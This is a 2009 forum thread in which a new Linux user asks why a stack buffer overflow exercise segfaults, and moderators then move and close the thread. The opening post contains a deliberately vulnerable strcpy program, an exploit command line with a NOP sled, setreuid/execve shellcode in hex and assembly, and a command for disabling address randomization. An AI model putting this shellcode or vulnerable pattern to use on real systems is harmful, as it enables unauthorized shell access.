---
title: "segmantation fault"
date: 2009-01-25
forum: Programming Talk
---

### Post by pente on 2009-01-25
:D Hi!

I just a new member of both the forum and ubuntu OS ;)!
I'm a computer programmer and i just leaning low level programing in linux.

Just now I'm trying to execute a program that a buffer overflow program but it don't work properly ... 

   Stack pointer (ESP) : 0xbffff534
       Offset from ESP : 0x0
 Desidered Return Addr : 0xbffff534


Here is the output in the Terminal ...

 ./vuln `perl -e 'print "\x90"x200;'``cat myshellcode``perl -e 'print "\x34\xf5\xff\xbf"x78;'`
Segmentation fault
 
Searching in internet I found that the 'cause of the segmentation fault may by the Stack Protection ok Ubuntu and the I can turn it off using

echo 0 > randomize_va_space

but it steal don't work ...

Could someone help me?? (I so sorry for my very wrong english)

Here is my the vuln.c code end the myshellcode code

// vuln.c
int main(int argc, char *argv[])
{
	char buffer[500];
	strcpy(buffer,argv[1]);
	return 0;
}

_____________________________
// myshellcode

\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42

 ... in .asm

        xor eax, eax

        mov al, 70              ;setreuid is syscall 70

        xor ebx, ebx

        xor ecx, ecx

        int 0x80



        jmp short ender



        starter:



        pop ebx                 ;get the address of the string

        xor eax, eax



        mov [ebx+7 ], al        ;put a NULL where the N is in the string

        mov [ebx+8 ], ebx       ;put the address of the string to where the

                                ;AAAA is

        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is

        mov al, 11              ;execve is syscall 11

        lea ecx, [ebx+8]        ;load the address of where the AAAA was

        lea edx, [ebx+12]       ;load the address of the NULLS

        int 0x80                ;call the kernel, WE HAVE A SHELL!



        ender:

        call starter

        db '/bin/shNAAAABBBB'

Thanks a lot for any help

---

### Post by cariboo on 2009-01-25
This isn't really the right place for this question, I have asked the mods to move this to programming talk.

JIm

---

### Post by pente on 2009-01-25
why not??? 
Here we are in 'Sicurity discussions', don't??
isn't it a sicurity discussion?

Where I have to post this thread in your opinion??

---

### Post by bapoumba on 2009-01-25
Moved to Programming Talk.

---

### Post by NathanB on 2009-01-25
Just last year, a former mod got in trouble for **criminal** activity on this forum.  In some countries, it would be considered **illegal** to assist you with this "shellcode" even if one's intentions are not malevolent (discussion within a "security" context).

That said, there exist a plethora of tutorials, working examples, and extensive explanation on this subject easily reachable by search engine.

---

### Post by bapoumba on 2009-01-25
Oh?
Nathan, I cannot read that code :/
I'm closing for others to look at, thanks.

---

